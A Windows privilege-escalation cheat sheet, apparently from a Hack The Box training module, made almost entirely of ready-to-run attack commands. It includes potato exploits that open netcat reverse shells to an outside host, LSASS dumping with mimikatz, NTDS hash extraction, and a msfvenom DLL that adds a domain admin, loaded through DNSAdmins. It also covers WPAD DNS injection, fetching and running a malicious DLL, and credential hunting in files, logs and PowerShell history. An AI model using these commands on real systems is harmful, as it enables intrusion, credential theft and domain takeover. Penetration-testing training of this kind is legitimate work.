# **Windows Privilege Escalation — Cheat Sheet**

---

# **1. Initial Enumeration**

## **RDP & Network Enumeration**

```bash
xfreerdp /v:<target ip> /u:htb-student
```

```powershell
ipconfig /all
arp -a
route print
netstat -ano
```

---

## **AppLocker & Windows Defender**

```powershell
Get-MpComputerStatus

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | select -ExpandProperty RuleCollections

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

---

## **System Information**

```powershell
set
systeminfo
wmic qfe
wmic product get name
```

---

## **Users, Groups, & Processes**

```powershell
tasklist /svc
query user
echo %USERNAME%
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net accounts
```

---

## **Named Pipes & IPC**

```powershell
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

---

# **2. Handy Commands (Core PrivEsc Tools)**

---

# **MSSQL - RCE - SYSTEM**

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Inside SQL:

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

---

# **Potato Attacks (SeImpersonate)**

### **JuicyPotato**

```bash
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```

### **PrintSpoofer** (Works on newer Windows 10+)

```bash
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

---

# **3. Credential Theft & LSASS Dumping**

### **Dump LSASS**

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### **Extract Credentials — Mimikatz**

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

# **4. File Ownership, ACLs & Restricted File Access**

### Ownership Check

```powershell
dir /q C:\backups\wwwroot\web.config
```

### Take Ownership

```powershell
takeown /f C:\backups\wwwroot\web.config
```

### View Owner

```powershell
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' |
    select name, directory, @{Name="Owner"; Expression={(Get-ACL $_.Fullname).Owner}}
```

### Grant Full Access

```powershell
icacls "C:\backups\wwwroot\web.config" /grant htb-student:F
```

---

# **5. NTDS Extraction & Domain Hashes**

### Impacket secretsdump

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Copy NTDS via Shadow Copy

```powershell
robocopy /B E:\Windows\NTDS\ntds ntds.dit
```

---

# **6. Event Log Credential Hunting**

### Local Logs

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

### Remote Logs

```powershell
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### ProcessCreate (4688) Scraping

```powershell
Get-WinEvent -LogName security |
 where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } |
 select @{name='CommandLine'; expression={ $_.Properties[8].Value }}
```

---

# **7. DNSAdmins - Domain Admin**

### Generate Malicious DLL

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Load DLL into DNS Service

```bash
dnscmd.exe /config /serverlevelplugindll adduser.dll
```

### Permissions Enumeration

```powershell
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
```

### Trigger DLL Execution

```bash
sc stop dns
sc start dns
```

### Cleanup

```powershell
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

---

# **8. WPAD Injection (DNS Hijack)**

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---

# **9. File Transfers & DLL Execution**

### File Transfer

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Execute Malicious DLL

```powershell
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

---

# **10. Credential Hunting**

### Search Files for Passwords

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Chrome Dictionary (often contains sensitive notes)

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### PowerShell History

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
```

### Credential XML

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

---

# **11. Search in User Documents**

```powershell
cd C:\Users\htb-student\Documents
findstr /SI /M "password" *.xml *.ini *.txt
```
